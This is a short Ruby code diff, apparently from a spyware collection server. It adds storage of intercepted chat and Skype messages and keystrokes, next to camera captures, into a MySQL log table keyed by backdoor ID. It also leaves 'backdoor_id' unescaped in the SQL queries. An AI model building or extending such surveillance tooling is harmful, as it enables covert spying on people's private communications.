@@ -50,11 +50,28 @@ module Evidence
                  '#{@mysql.escape(evidence.info[:process_name])}',
                  '#{@mysql.escape(evidence.info[:window_name])}',
                  '#{@mysql.escape(evidence.info[:keystrokes])}')"
+      when :CHAT, :CHATSKYPE
+        # override the CHATSKYPE
+        evidence.info[:type] = :CHAT
+        q = "INSERT INTO log (tag, type, flags, backdoor_id, remoteip, remotehost, remoteuser, received, acquired, varchar1, varchar2, varchar3, longtext1)
+                 VALUES (0,
+                 '#{@mysql.escape(evidence.info[:type].to_s)}',
+                 1,
+                 #{evidence.info[:backdoor_id]},
+                 '#{@mysql.escape(evidence.info[:source_id])}',
+                 '#{@mysql.escape(evidence.info[:device_id])}',
+                 '#{@mysql.escape(evidence.info[:user_id])}',
+                 '#{@mysql.escape(evidence.info[:received].to_s)}',
+                 '#{@mysql.escape(evidence.info[:acquired].to_s)}',
+                 '#{@mysql.escape(evidence.info[:program])}',
+                 '#{@mysql.escape(evidence.info[:topic])}',
+                 '#{@mysql.escape(evidence.info[:users])}',
+                 '#{@mysql.escape(evidence.info[:keystrokes])}')"
       when :CAMERA
         q = "INSERT INTO log (`tag`, `type`, `flags`, `backdoor_id`, `remoteip`, `remotehost`, `remoteuser`, `received`, `acquired`, `int1`, `longblob1`)
                  VALUES (0,
                  '#{@mysql.escape(evidence.info[:type].to_s)}',
-                 #{cacheable},
+                 1,
                  #{evidence.info[:backdoor_id]},
                  '#{@mysql.escape(evidence.info[:source_id])}',
                  '#{@mysql.escape(evidence.info[:device_id])}',
